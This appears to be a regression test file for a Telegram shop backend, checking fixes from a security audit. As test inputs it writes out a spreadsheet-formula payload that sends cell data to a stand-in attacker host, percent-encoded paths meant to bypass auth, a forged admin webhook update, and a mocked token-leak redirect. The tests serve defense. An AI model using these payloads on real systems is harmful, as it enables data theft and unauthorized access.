/* Regression tests for SECURITY_AUDIT.md: each one failed before its fix. */
import { existsSync, mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { eq } from 'drizzle-orm';
import type { FastifyInstance } from 'fastify';
import { afterAll, describe, expect, it } from 'vitest';
import { subjectNo, type ApiBootstrap } from '@mrak8/shared';
import { buildApp } from '../src/app.js';
import { signInitData } from '../src/auth.js';
import { createBot, notifyDrop, setupBot } from '../src/bot/index.js';
import { loadConfig, type Config } from '../src/config.js';
import { migrateDatabase, openDatabase, type Database } from '../src/db/index.js';
import { orders, users } from '../src/db/schema.js';
import { startJobs } from '../src/jobs.js';
import { seed } from '../src/db/seed.js';
import { createCdek } from '../src/services/cdek.js';
import { addTrack } from '../src/services/dj.js';
import { createStorage } from '../src/services/storage.js';
import { startFakeBotApi } from './fake-bot-api.js';

const TOKEN = '123456789:TEST-security-token';
const STRONG = 'k'.repeat(48);
const ADMIN = 42;
const silent = { info() {}, warn() {}, error() {} };
const tma = (id: number) => ({ authorization: 'tma ' + signInitData({ user: JSON.stringify({ id, first_name: 'S' }), auth_date: String(Math.floor(Date.now() / 1000)) }, TOKEN) });
const protocol = { name: 'Субъект Восемь', phone: '+79990080808', delivery: 'post', address: 'Москва, ул. Тестовая, 8' };

const cleanup: (() => Promise<unknown> | void)[] = [];
afterAll(async () => { for (const f of cleanup.reverse()) await f(); });

let api: Awaited<ReturnType<typeof startFakeBotApi>> | null = null;
const fakeApi = async () => (api ??= await startFakeBotApi().then((a) => { cleanup.push(() => a.close()); return a; }));

/** a fresh app on its own in-memory database; `withBot` wires a bot to the fake Bot API */
async function makeApp(env: Record<string, string> = {}, opts: { botMode?: 'webhook' | 'polling' | 'off'; databaseUrl?: string } = {}) {
  const media = mkdtempSync(join(tmpdir(), 'mrak8-sec-'));
  const botMode = opts.botMode ?? 'off';
  const fake = botMode === 'off' ? null : await fakeApi();
  const cfg: Config = loadConfig({ NODE_ENV: 'test', BOT_TOKEN: TOKEN, ADMIN_IDS: String(ADMIN), MEDIA_DIR: media, BOT_API_ROOT: fake?.url ?? '', ...env });
  const database: Database = await openDatabase(opts.databaseUrl ?? '', 'memory://');
  await migrateDatabase(database);
  const storage = createStorage(cfg);
  await seed(database.db, storage, { images: false });
  const bot = fake ? createBot({ cfg, db: database.db, storage, log: silent }) : null;
  if (bot) bot.botInfo = { id: 1, is_bot: true, first_name: 'b', username: 'b' } as never;
  const close = async () => { await app?.close(); await database.close(); rmSync(media, { recursive: true, force: true }); };
  let app: FastifyInstance | undefined;
  try {
    app = await buildApp({ cfg, db: database.db, storage, bot, botMode });
  } catch (e) {
    await close();
    throw e;
  }
  cleanup.push(close);
  const product = async (no = '001') => ((await app!.inject({ method: 'GET', url: '/api/bootstrap', headers: tma(1) })).json() as ApiBootstrap).products.find((p) => p.no === no)!;
  return { app, cfg, db: database.db, bot, api: fake, product };
}

describe('F-01 webhook secret', () => {
  const prod = { NODE_ENV: 'production', BOT_TOKEN: TOKEN, WEBAPP_URL: 'https://shop.example', PUBLIC_URL: 'https://shop.example' };
  it('production refuses to start in webhook mode without a strong secret', () => {
    expect(() => loadConfig({ ...prod, BOT_MODE: 'auto' })).toThrow(/WEBHOOK_SECRET/);
    expect(() => loadConfig({ ...prod, BOT_MODE: 'webhook', WEBHOOK_SECRET: 'change-me-to-a-long-random-string' })).toThrow(/WEBHOOK_SECRET/);
    expect(() => loadConfig({ ...prod, BOT_MODE: 'webhook', WEBHOOK_SECRET: 'short' })).toThrow(/WEBHOOK_SECRET/);
    expect(loadConfig({ ...prod, BOT_MODE: 'webhook', WEBHOOK_SECRET: STRONG }).WEBHOOK_SECRET).toBe(STRONG);
    expect(() => loadConfig({ ...prod, BOT_MODE: 'polling' })).not.toThrow();
  });
  it('the webhook route is never mounted with a weak secret', async () => {
    await expect(makeApp({ WEBHOOK_SECRET: '' }, { botMode: 'webhook' })).rejects.toThrow(/WEBHOOK_SECRET/);
  });
  it('a forged update without the header is rejected and ignored', async () => {
    const { app, api } = await makeApp({ WEBHOOK_SECRET: STRONG }, { botMode: 'webhook' });
    const before = api!.of('sendMessage').length;
    const update = { update_id: 1, message: { message_id: 1, date: 0, chat: { id: 424242, type: 'private', first_name: 'x' }, from: { id: ADMIN, is_bot: false, first_name: 'x' }, text: '/admin', entities: [{ type: 'bot_command', offset: 0, length: 6 }] } };
    expect((await app.inject({ method: 'POST', url: '/telegram/webhook', payload: update })).statusCode).toBe(401);
    expect((await app.inject({ method: 'POST', url: '/telegram/webhook', payload: update, headers: { 'x-telegram-bot-api-secret-token': 'guess' } })).statusCode).toBe(401);
    expect(api!.of('sendMessage').length).toBe(before);
  });
});

describe('F-02 dev-only routes', () => {
  it('payment emulation is off without DEV_AUTH even when NODE_ENV is not production', async () => {
    const { app, product } = await makeApp({ NODE_ENV: 'development' });
    const p = await product();
    const o = await app.inject({ method: 'POST', url: '/api/orders', headers: tma(7001), payload: { items: [{ productId: p.id, size: 'M', qty: 1 }], protocol } });
    expect(o.statusCode).toBe(200);
    const pay = await app.inject({ method: 'POST', url: `/api/dev/pay/${o.json().order.no}`, headers: tma(7001) });
    expect(pay.statusCode).toBe(404);
    const mine = (await app.inject({ method: 'GET', url: '/api/orders', headers: tma(7001) })).json();
    expect(mine[0].status).toBe('pending');
  });
  it('DEV_AUTH is refused anywhere but localhost', () => {
    expect(() => loadConfig({ NODE_ENV: 'development', DEV_AUTH: '1', PUBLIC_URL: 'https://abc.trycloudflare.com' })).toThrow(/DEV_AUTH/);
  });
});

describe('F-03 auth by the matched route', () => {
  it('a percent-encoded /api path still needs initData', async () => {
    const { app } = await makeApp();
    for (const url of ['/%61pi/dj', '/%61pi/bootstrap', '/%61pi/orders', '/api/%64j']) {
      expect((await app.inject({ method: 'GET', url })).statusCode, url).toBe(401);
    }
    expect((await app.inject({ method: 'GET', url: '/%61pi/dj', headers: tma(7002) })).statusCode).toBe(200);
    expect((await app.inject({ method: 'GET', url: '/%61pi/health' })).statusCode).toBe(200);
  });
});

/** a live product with one size and plenty of stock, made through the admin API */
async function stockedProduct(app: FastifyInstance, stock: number) {
  const no = String(1000 + Math.floor(Math.random() * 8999));
  const r = await app.inject({ method: 'POST', url: '/api/admin/products', headers: tma(ADMIN), payload: { no, slug: `sec-${no}`, title: `SEC ${no}`, category: 'tee', price: 1000, status: 'live', sizes: [{ label: 'M', stock, heightMin: null, heightMax: null, length: null, width: null, sleeve: null }] } });
  expect(r.statusCode).toBe(200);
  const id = r.json().id as number;
  const size = async () => (await app.inject({ method: 'GET', url: `/api/admin/products/${id}`, headers: tma(ADMIN) })).json().sizesAdmin[0] as { stock: number; reserved: number };
  return { id, size };
}

describe('F-04 one subject cannot take a whole size', () => {
  it('repeated lines are capped after merging', async () => {
    const { app } = await makeApp();
    const p = await stockedProduct(app, 100);
    const items = Array.from({ length: 10 }, () => ({ productId: p.id, size: 'M', qty: 10 }));
    const r = await app.inject({ method: 'POST', url: '/api/orders', headers: tma(7010), payload: { items, protocol } });
    expect(r.json()).toMatchObject({ error: 'TOO_MANY' });
    const two = await app.inject({ method: 'POST', url: '/api/orders', headers: tma(7010), payload: { items: [{ productId: p.id, size: 'M', qty: 2 }, { productId: p.id, size: 'M', qty: 2 }], protocol } });
    expect(two.json()).toMatchObject({ error: 'TOO_MANY' });
    expect((await p.size()).reserved).toBe(0);
    expect((await app.inject({ method: 'POST', url: '/api/orders', headers: tma(7010), payload: { items: [{ productId: p.id, size: 'M', qty: 3 }], protocol } })).statusCode).toBe(200);
  });
});

// a real race needs real connections: PGlite runs one transaction at a time. Set TEST_DATABASE_URL to an empty Postgres.
describe.skipIf(!process.env.TEST_DATABASE_URL)('F-05 one pending order per subject (Postgres)', () => {
  it('20 concurrent orders from one subject leave one reserve', async () => {
    const { app } = await makeApp({}, { databaseUrl: process.env.TEST_DATABASE_URL });
    const p = await stockedProduct(app, 50);
    const subject = 7000 + Math.floor(Math.random() * 999);
    await Promise.all(Array.from({ length: 20 }, () => app.inject({ method: 'POST', url: '/api/orders', headers: tma(subject), payload: { items: [{ productId: p.id, size: 'M', qty: 2 }], protocol } })));
    const pending = (await app.inject({ method: 'GET', url: '/api/orders', headers: tma(subject) })).json().filter((o: { status: string }) => o.status === 'pending');
    expect(pending.length).toBe(1);
    expect((await p.size()).reserved).toBe(2);
  });
});

describe('F-06 rate limits (and F-20 trusted proxies)', () => {
  it('the 11th order in a minute is refused, other subjects are not affected', async () => {
    const { app } = await makeApp();
    const p = await stockedProduct(app, 100);
    const place = (id: number) => app.inject({ method: 'POST', url: '/api/orders', headers: tma(id), payload: { items: [{ productId: p.id, size: 'M', qty: 1 }], protocol } });
    for (let i = 0; i < 10; i++) expect((await place(7020)).statusCode).toBe(200);
    const eleventh = await place(7020);
    expect(eleventh.statusCode).toBe(429);
    expect(Number(eleventh.headers['retry-after'])).toBeGreaterThan(0);
    expect((await place(7021)).statusCode).toBe(200);
  });
  it('the public audio route is limited per client IP, and a public client cannot pick its IP', async () => {
    const { app } = await makeApp();
    const hit = (i: number) => app.inject({ method: 'GET', url: '/dj/1', remoteAddress: '203.0.113.5', headers: { 'x-forwarded-for': `198.51.100.${i % 250}` } });
    for (let i = 0; i < 120; i++) expect((await hit(i)).statusCode).not.toBe(429);
    expect((await hit(120)).statusCode).toBe(429);
  });
});

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
/** a «drop soon» product (or one whose time has come) with subjects watching it */
async function watchedDrop(app: FastifyInstance, dropAt: Date, watchers: number[]) {
  const no = String(1000 + Math.floor(Math.random() * 8999));
  const r = await app.inject({ method: 'POST', url: '/api/admin/products', headers: tma(ADMIN), payload: { no, slug: `drop-${no}`, title: `DROP ${no}`, category: 'tee', price: 1000, status: 'drop', dropAt: dropAt.toISOString(), sizes: [{ label: 'M', stock: 5, heightMin: null, heightMax: null, length: null, width: null, sleeve: null }] } });
  const id = r.json().id as number;
  for (const w of watchers) expect((await app.inject({ method: 'POST', url: `/api/drops/${id}/watch`, headers: tma(w), payload: { on: true } })).statusCode).toBe(200);
  return id;
}

describe('F-07 drop notifications', () => {
  it('a 429 from Telegram is waited out, not lost', async () => {
    const { app, cfg, db, bot, api } = await makeApp({}, { botMode: 'polling' });
    const id = await watchedDrop(app, new Date(Date.now() + 86_400_000), [7030, 7031]);
    api!.failNext('sendMessage', { error_code: 429, description: 'Too Many Requests: retry after 1', parameters: { retry_after: 1 } });
    expect(await notifyDrop({ cfg, db, storage: createStorage(cfg), log: silent }, bot!, id)).toBe(2);
  });
  it('reserves keep expiring while a drop is being announced', async () => {
    const { app, cfg, db, bot, api } = await makeApp({}, { botMode: 'polling' });
    await watchedDrop(app, new Date(Date.now() - 1000), [7040]);
    const p = await stockedProduct(app, 5);
    const o = await app.inject({ method: 'POST', url: '/api/orders', headers: tma(7041), payload: { items: [{ productId: p.id, size: 'M', qty: 1 }], protocol } });
    const no = o.json().order.no as string;
    api!.slow.sendMessage = 3000; // Telegram answering slowly to a big announcement
    const stop = startJobs({ cfg, db, storage: createStorage(cfg), log: silent }, bot, 200);
    try {
      await sleep(150); // the first tick is messaging the watcher now
      await db.update(orders).set({ reservedUntil: new Date(Date.now() - 1000) }).where(eq(orders.no, no));
      await sleep(800);
      const [row] = await db.select().from(orders).where(eq(orders.no, no));
      expect(row.status).toBe('expired');
    } finally {
      stop();
      delete api!.slow.sendMessage;
      await sleep(3000); // let the in-flight announcement finish before the database closes
    }
  });
});

describe('F-08 CSV export', () => {
  it('customer text cannot become an Excel formula', async () => {
    const { app, product } = await makeApp();
    const p = await product();
    const evil = '=HYPERLINK("https://evil.example/?"&H2,"x")';
    expect((await app.inject({ method: 'POST', url: '/api/orders', headers: tma(7050), payload: { items: [{ productId: p.id, size: 'M', qty: 1 }], protocol: { ...protocol, name: evil, comment: '@SUM(1+1)' } } })).statusCode).toBe(200);
    const csv = (await app.inject({ method: 'GET', url: '/api/admin/orders.csv', headers: tma(ADMIN) })).body;
    const cells = csv.split(/[;\r\n]/);
    expect(cells.filter((c) => /^"[=+\-@]/.test(c))).toEqual([]);
    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example/?""&H2,""x"")"`);
    expect(csv).toContain(`"'@SUM(1+1)"`);
  });
});

describe('F-09 database role', () => {
  it('the app does not connect as the Postgres superuser, and no password has a default', () => {
    const compose = readFileSync(new URL('../../docker-compose.yml', import.meta.url), 'utf8');
    const superuser = /POSTGRES_USER:\s*(\S+)/.exec(compose)![1];
    const appUser = /DATABASE_URL:\s*postgres:\/\/([^:]+):/.exec(compose)![1];
    expect(appUser).not.toBe(superuser);
    expect(compose).toContain('/docker-entrypoint-initdb.d/');
    expect(compose).not.toMatch(/PASSWORD:-/);
    expect(readFileSync(new URL('../../docker/db-init.sh', import.meta.url), 'utf8')).toMatch(/CREATE ROLE mrak8 .*NOSUPERUSER/);
  });
});

describe('F-10 bot start', () => {
  it('menu buttons for every known subject are synced in the background', async () => {
    const { cfg, db, bot, api } = await makeApp({ WEBAPP_URL: 'https://shop.example', PUBLIC_URL: 'https://shop.example' }, { botMode: 'polling' });
    await db.insert(users).values(Array.from({ length: 40 }, (_, i) => ({ id: 8000 + i, firstName: 'u', subjectNo: subjectNo(8000 + i) })));
    api!.slow.setChatMenuButton = 50;
    const t = Date.now();
    try {
      await setupBot({ cfg, db, storage: createStorage(cfg), log: silent }, bot!, 'polling');
      expect(Date.now() - t).toBeLessThan(1000); // 40 subjects × 50 ms would be 2 s when awaited
    } finally {
      delete api!.slow.setChatMenuButton;
    }
  });
});

describe('F-11 malformed ids', () => {
  it('answer 404, not a database error', async () => {
    const { app } = await makeApp();
    const cases = [['GET', '/api/products/abc'], ['GET', '/api/products/1.5'], ['GET', '/api/products/99999999999'], ['POST', '/api/drops/abc/watch'], ['GET', '/api/orders/%00'], ['POST', '/api/orders/x/cancel'], ['GET', '/dj/abc']] as const;
    for (const [method, url] of cases) {
      const r = await app.inject({ method, url, headers: tma(7060), payload: method === 'POST' ? { on: true } : undefined });
      expect(r.statusCode, url).toBe(404);
    }
  });
});

describe('F-12 drafts stay invisible', () => {
  it('neither the watch route nor an order error reveals a draft', async () => {
    const { app } = await makeApp();
    const no = String(1000 + Math.floor(Math.random() * 8999));
    const created = await app.inject({ method: 'POST', url: '/api/admin/products', headers: tma(ADMIN), payload: { no, slug: `draft-${no}`, title: 'DRAFT', category: 'tee', price: 1000, status: 'draft', sizes: [{ label: 'M', stock: 5, heightMin: null, heightMax: null, length: null, width: null, sleeve: null }] } });
    const draft = created.json().id;
    expect((await app.inject({ method: 'POST', url: `/api/drops/${draft}/watch`, headers: tma(7061), payload: { on: true } })).statusCode).toBe(404);
    const o = await app.inject({ method: 'POST', url: '/api/orders', headers: tma(7061), payload: { items: [{ productId: draft, size: 'M', qty: 1 }], protocol } });
    expect(o.statusCode).toBe(409);
    expect(o.json().message).not.toContain(no);
  });
});

describe('F-13 security headers', () => {
  it('nosniff and referrer policy everywhere, HSTS in production over https', async () => {
    const { app } = await makeApp({ NODE_ENV: 'production', BOT_MODE: 'polling', PUBLIC_URL: 'https://shop.example', WEBAPP_URL: 'https://shop.example' });
    const r = await app.inject({ method: 'GET', url: '/api/health' });
    expect(r.headers['x-content-type-options']).toBe('nosniff');
    expect(r.headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
    expect(r.headers['strict-transport-security']).toMatch(/max-age=\d+/);
  });
});

describe.skipIf(!process.env.TEST_DATABASE_URL)('F-14 database timeouts (Postgres)', () => {
  it('queries are cut off instead of hanging', async () => {
    const { db } = await makeApp({}, { databaseUrl: process.env.TEST_DATABASE_URL });
    const r = await db.execute('show statement_timeout');
    expect((r.rows[0] as { statement_timeout: string }).statement_timeout).toBe('10s');
  });
});

describe('F-15 DJ files', () => {
  it('concurrent first plays download once; a removed track leaves no file behind', async () => {
    const { app, cfg, db, bot, api } = await makeApp({}, { botMode: 'polling' });
    const t = (await addTrack(db, { file_id: 'F15', file_unique_id: 'U15', title: 'T' }))!;
    const before = api!.of('getFile').length;
    const plays = await Promise.all(Array.from({ length: 5 }, () => app.inject({ method: 'GET', url: `/dj/${t.id}` })));
    expect(plays.map((p) => p.statusCode)).toEqual([200, 200, 200, 200, 200]);
    expect(api!.of('getFile').length - before).toBe(1);
    const file = join(cfg.MEDIA_DIR, 'dj', 'U15.mp3');
    expect(existsSync(file)).toBe(true);
    const del = { id: 'q', from: { id: ADMIN, is_bot: false, first_name: 'a' }, chat_instance: 'c', data: `dj:del:${t.id}`, message: { message_id: 1, date: 0, chat: { id: ADMIN, type: 'private', first_name: 'a' }, text: 'DJ SET' } };
    await bot!.handleUpdate({ update_id: 1, callback_query: del } as never);
    expect(existsSync(file)).toBe(false);
  });
});

describe('F-16 payment cross-check', () => {
  it('a payment that differs from the order is flagged to the admins', async () => {
    const { app, db, bot, api, product } = await makeApp({ ADMIN_CHAT_ID: '-100777' }, { botMode: 'polling' });
    const p = await product();
    const placed = await app.inject({ method: 'POST', url: '/api/orders', headers: tma(7070), payload: { items: [{ productId: p.id, size: 'M', qty: 1 }], protocol } });
    const [o] = await db.select().from(orders).where(eq(orders.no, placed.json().order.no));
    const sp = { currency: 'RUB', total_amount: 100, invoice_payload: o.payload, telegram_payment_charge_id: 'tg-f16', provider_payment_charge_id: 'pr-f16' };
    await bot!.handleUpdate({ update_id: 2, message: { message_id: 2, date: 0, chat: { id: 7070, type: 'private', first_name: 's' }, from: { id: 7070, is_bot: false, first_name: 's' }, successful_payment: sp } } as never);
    const toAdmins = api!.of('sendMessage').filter((c) => String(c.body.chat_id) === '-100777').at(-1)!;
    expect(toAdmins.body.text).toContain('СУММА НЕ СОВПАЛА');
  });
});

describe('F-18 CDEK waybill link', () => {
  it('the CDEK token is never sent outside cdek.ru', async () => {
    const cdek = createCdek(loadConfig({ NODE_ENV: 'test', CDEK_MODE: 'test' }))!;
    const real = globalThis.fetch;
    const seen: string[] = [];
    const json = (j: unknown) => new Response(JSON.stringify(j), { status: 200, headers: { 'content-type': 'application/json' } });
    globalThis.fetch = (async (input: string | URL) => {
      const url = String(input);
      seen.push(url);
      if (url.includes('/oauth/token')) return json({ access_token: 'secret-token', expires_in: 3600 });
      if (url.endsWith('/print/orders')) return json({ entity: { uuid: 'p1' } });
      if (url.includes('/print/orders/p1')) return json({ entity: { url: 'https://evil.example/waybill.pdf' } });
      return new Response('%PDF', { status: 200 });
    }) as typeof fetch;
    try {
      await expect(cdek.waybill('order-uuid')).rejects.toThrow(/cdek\.ru/);
      expect(seen.some((u) => u.includes('evil.example'))).toBe(false);
    } finally {
      globalThis.fetch = real;
    }
  });
});

describe('F-02 dev-only routes (localhost)', () => {
  it('DEV_AUTH works on localhost', () => {
    expect(() => loadConfig({ NODE_ENV: 'development', DEV_AUTH: '1', PUBLIC_URL: 'http://localhost:8080' })).not.toThrow();
  });
});
